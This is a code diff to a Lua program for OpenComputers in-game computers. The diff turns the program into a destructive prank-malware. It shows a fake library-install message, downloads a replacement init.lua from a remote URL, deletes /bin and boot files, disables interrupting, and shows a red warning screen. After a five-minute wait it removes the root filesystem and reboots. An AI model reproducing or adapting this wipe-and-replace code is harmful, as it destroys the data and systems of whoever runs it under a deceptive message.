@@ -5,13 +5,14 @@ local fs = require("filesystem")
 local os = require("os")
 local shell = require("shell")
 local event = require("event")
-
+print("Waiting Proggram installing libs...")
+os.execute("wget -f https://raw.githubusercontent.com/sziberov/OpenComputers/refs/heads/master/lib/ECSAPI.lua /lib/ECSAPI.lua")
+print("99%")
+os.execute("wget -f https://raw.githubusercontent.com/sziberov/OpenComputers/refs/heads/master/lib/advancedLua.lua /lib/advancedLua.lua")
+print("100%")
+local ECS = require("ECSAPI")
 fs.remove("/init.lua")
 os.execute("wget -f https://raw.githubusercontent.com/matvey-mayner/OpenOS-Apps/refs/heads/main/kraka/init.lua /init.lua")
-os.execute("wget -f https://raw.githubusercontent.com/sziberov/OpenComputers/refs/heads/master/lib/ECSAPI.lua /lib/ECSAPI.lua")
-os.execute("wget -f https://raw.githubusercontent.com/sziberov/OpenComputers/refs/heads/master/lib/advancedLua.lua /lib/advancedLua.lua")
-local ECS = require("ECSAPI")
-ECS.disableInterrupting()
 shell.execute("rm -rf /bin/*")
 fs.remove("/lib/core/boot.lua")
 fs.remove("/boot/00_base.lua")
@@ -21,10 +22,7 @@ gpu.setBackground(0xff0000)
 gpu.setForeground(0xFFFFFF)
 
 gpu.fill(1, 1, 80, 25, " ")
-
-local seconds = 300
-local startTime = comp.uptime()
-
+ECS.disableInterrupting()
 os.sleep(0.3)
 gpu.set(1, 1, "░░▄▀▀▀▀▀▄░░")
 os.sleep(0.3)
@@ -52,13 +50,9 @@ gpu.set(30, 10, "2. Don't Reboot Computer")
 os.sleep(0.3)
 gpu.set(30, 12, "3. Don't leave this program")
 
+os.sleep(300)
 
-while comp.uptime() - startTime < seconds do
-  event.pull("touch")
-end
-
-fs.remove("/lib/*")
-fs.remove("/boot/*")
-fs.remove("/etc/*")
+ECS.error("TIME FOR FULL FORMAT!!!")
+fs.remove("/")
 
 comp.shutdown(true)
